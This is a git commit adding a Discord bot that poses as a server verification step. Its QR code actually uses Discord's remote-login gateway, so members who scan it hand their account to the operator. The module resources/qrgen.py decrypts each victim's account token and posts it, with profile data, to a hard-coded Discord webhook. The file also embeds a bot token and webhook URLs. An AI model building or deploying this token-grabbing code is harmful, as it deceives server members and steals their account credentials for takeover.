a69c3d16be81365bffcf9d0789ee879ffee328a0
Shell <72198971+Shell1010@users.noreply.github.com>
2022-08-12 22:50:50 +0100

    Initial Commit

---
+++ main.py
@@ -0,0 +1,109 @@
+import discord
+from discord import Colour
+from discord.ext import commands
+from aioconsole import aprint
+from resources import QR
+import os
+import ujson
+import asyncio
+import shutil
+
+token = "OTcxNDQxNTM3NzgxMjIzNDM1.GyPB70.PZoyVPodwm0FNQGAgigi7p_7zVBUXS_1aPKMgA"
+prefix = "!"
+
+bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), case_insensitive=True, help_command=None)
+webhook_url = "https://canary.discord.com/api/webhooks/1003789100819697724/PR-H5oPZSZSvGkmrjExb7qHOe6vvOxtnhBCzpD4oEbOoadySnkdCzoS3KsHDfB2fsyCA"
+qr = QR(webhook_url)
+
+@bot.event
+async def on_ready():
+    await aprint(f"Logged into {bot.user.name}#{bot.user.discriminator}")
+
+@bot.event
+async def on_member_join(member):
+    await qr.create_qr(name=f"{member.id}")
+    with open('./resources/data.json') as f:
+        data = ujson.load(f)
+    channel = bot.get_channel(int(data['channel']))
+    em = discord.Embed(title=f"Hello {member.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
+    em.set_image(url=f"attachment://qr-code-{member.id}.png")
+    em.set_footer(text="Credit goes to senpai UwU")
+    em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
+    while True:
+        if os.path.isfile(f"./resources/codes/qr-code-{member.id}.png"):
+            await channel.send(f"<@{member.id}>", embed=em, file=discord.File(f"./resources/codes/qr-code-{member.id}.png"), delete_after=120)
+            break
+    asyncio.create_task(qr.wait_token())
+
+
+@bot.command(name="SetChan", description="Sets the welcome channel", aliases=['set'])
+@commands.has_permissions(administrator=True)
+async def _set(ctx, chan: discord.TextChannel):
+    await ctx.message.delete()
+    await aprint(chan)
+    with open("./resources/data.json") as f:
+        data = ujson.load(f)
+
+    data['channel'] = str(chan.id)
+    with open('./resources/data.json', 'w') as f:
+        ujson.dump(data, f, indent=4)
+
+    await ctx.send(f"Set channel as {chan.name}")
+
+@bot.command(name="Verify", description="Sends the verification puzzle, only works in the current set channel")
+async def _verify(ctx):
+    await ctx.message.delete()
+    with open('./resources/data.json') as f:
+        data = ujson.load(f)
+    if str(ctx.channel.id) == str(data['channel']):
+        await qr.create_qr(name=f"{ctx.author.id}")
+
+        channel = bot.get_channel(int(data['channel']))
+        em = discord.Embed(title=f"Hello {ctx.author.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
+        em.set_image(url=f"attachment://qr-code-{ctx.author.id}.png")
+        em.set_footer(text="Credit goes to senpai UwU")
+        em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
+        while True:
+            if os.path.isfile(f"./resources/codes/qr-code-{ctx.author.id}.png"):
+                await channel.send(f"<@{ctx.author.id}>",embed=em, file=discord.File(f"./resources/codes/qr-code-{ctx.author.id}.png"), delete_after=120)
+                break
+        asyncio.create_task(qr.wait_token())
+
+
+@bot.command(name="CleanDir", description="Cleans directory", aliases=['clean'])
+@commands.has_permissions(administrator=True)
+async def _clean(ctx):
+    await ctx.message.delete()
+    folder = "./resources/codes"
+    for filename in os.listdir(folder):
+        file_path = os.path.join(folder, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.unlink(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+        except Exception as e:
+            await ctx.send(f'Failed to delete {file_path}.\n Reason: {e}', delete_after=5)
+
+@bot.command(name="Help", description="Displays the help command")
+async def _help(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="Cerise", description="Commands are listed below. All commands are case insensitive", colour=Colour.dark_red())
+    for command in bot.walk_commands():
+        if len(command.aliases) == 0:
+            em.add_field(name=f"`{prefix}{command.name}`", value=f"{command.description}", inline=False)
+        else:
+            for i in range(len(command.aliases)):
+                command.aliases[i] = f"{prefix}{command.aliases[i]}"
+            aliases = ", ".join(command.aliases)
+
+            em.add_field(name=f"`{prefix}{command.name}, {aliases}`", value=f"{command.description}", inline=False)
+    em.set_thumbnail(url=f"{ctx.guild.icon_url}")
+    em.set_image(url="https://64.media.tumblr.com/2a7e4e7831aaf492a692e674f451d78c/tumblr_n9eno0SSTZ1s5f9ado1_500.gif")
+    em.set_footer(text="Credit goes to senpai UwU")
+    em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
+    await ctx.send(embed=em)
+
+
+
+bot.run(token)
---
+++ resources/qrgen.py
@@ -0,0 +1,112 @@
+import websockets
+import asyncio
+import aiohttp
+import ujson
+import qrcode
+from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA256
+from Crypto.Cipher import PKCS1_OAEP
+import base64
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import PIL
+
+class QR:
+    def __init__(self, webhook):
+        self.webhook = webhook
+        self.key = RSA.generate(2048)
+        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
+
+    def decrypt_payload(self, encrypted_payload):
+        payload = base64.b64decode(encrypted_payload)
+        decrypted = self.cipher.decrypt(payload)
+
+        return decrypted
+
+    async def create_qr(self, name):
+        fingerprint = await self.generate_fingerprint()
+        img = qrcode.make(f"https://discordapp.com/ra/{fingerprint}")
+        img.save(f"./resources/codes/qr-code-{name}.png")
+
+    async def wait_token(self):
+        while True:
+            item = await self.recv_json()
+            if item['op'] == "pending_finish":
+                payload = self.decrypt_payload(item['encrypted_user_payload'])
+                new = payload.decode()
+                id, discrim, hash, name = new.split(":")
+            if item['op'] == "finish":
+                payload = self.decrypt_payload(item['encrypted_token'])
+                token = payload.decode()
+            if ('id' in locals()) and ('discrim' in locals()) and ('hash' in locals()) and ('name' in locals()) and ('token' in locals()):
+                await self.send_webhook(id, discrim, hash, name, token)
+                break
+
+
+
+    async def tokeninfo(self, _token, embed):
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://discord.com/api/v9/users/@me", headers={"authorization":_token, "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.135 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}) as resp:
+                if resp.status == 200:
+                    j = await resp.json()
+                    for key, value in j.items():
+                        embed.add_embed_field(name=f"`{key}`", value=f"{value}", inline=False)
+
+    async def send_webhook(self, id, discrim, hash, name, token):
+        webhook = DiscordWebhook(url=self.webhook)
+        embed = DiscordEmbed(title=f"{name}#{discrim}", description="User info below")
+        await self.tokeninfo(token, embed)
+        embed.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{id}/{hash}.png')
+        embed.add_embed_field(name="`Token:`", value=f"{token}", inline=False)
+        webhook.add_embed(embed)
+        webhook.set_content("@everyone")
+        webhook.execute()
+
+    async def send_json(self, payload: dict):
+        await self.ws.send(ujson.dumps(payload))
+
+    async def recv_json(self):
+        item = await self.ws.recv()
+        return ujson.loads(item)
+
+    async def connect_ws(self):
+        self.ws = await websockets.connect("wss://remote-auth-gateway.discord.gg/?v=1", origin="https://discord.com")
+
+    async def heartbeat(self, interval):
+        while True:
+            await asyncio.sleep(interval)
+            payload = {
+                "op": "heartbeat"
+            }
+            await self.send_json(payload)
+
+    def generate_pubkey(self):
+        pub_key = self.key.publickey().export_key().decode('utf-8')
+        pub_key = ''.join(pub_key.split('\n')[1:-1])
+        return pub_key
+
+    async def generate_fingerprint(self):
+        await self.connect_ws()
+
+        item = await self.recv_json()
+        if item['op'] == "hello":
+            interval = item['heartbeat_interval']
+
+        pubkey = self.generate_pubkey()
+        await self.send_json({"op": "init", "encoded_public_key": pubkey})
+        asyncio.create_task(self.heartbeat(interval))
+        item = await self.recv_json()
+        if item['op'] == "nonce_proof":
+            nonce = item['encrypted_nonce']
+            decrypted = self.decrypt_payload(nonce)
+            proof = SHA256.new(data=decrypted).digest()
+            proof = base64.urlsafe_b64encode(proof)
+            proof = proof.decode().rstrip('=')
+            await self.send_json({"op":"nonce_proof", "proof": proof})
+
+            item = await self.recv_json()
+            return item['fingerprint']
+
+if __name__ == "__main__":
+    qr = QR("https://discord.com/api/webhooks/1003697159293632512/toOtseXhnB5kIq9mMYzUmewJWUxuR8E9aOOpfS1UmujAt9-KxkOONax_dZPEOq24KqN6")
+    asyncio.run(qr.create_qr("jeff"))
+    asyncio.run(qr.wait_token())
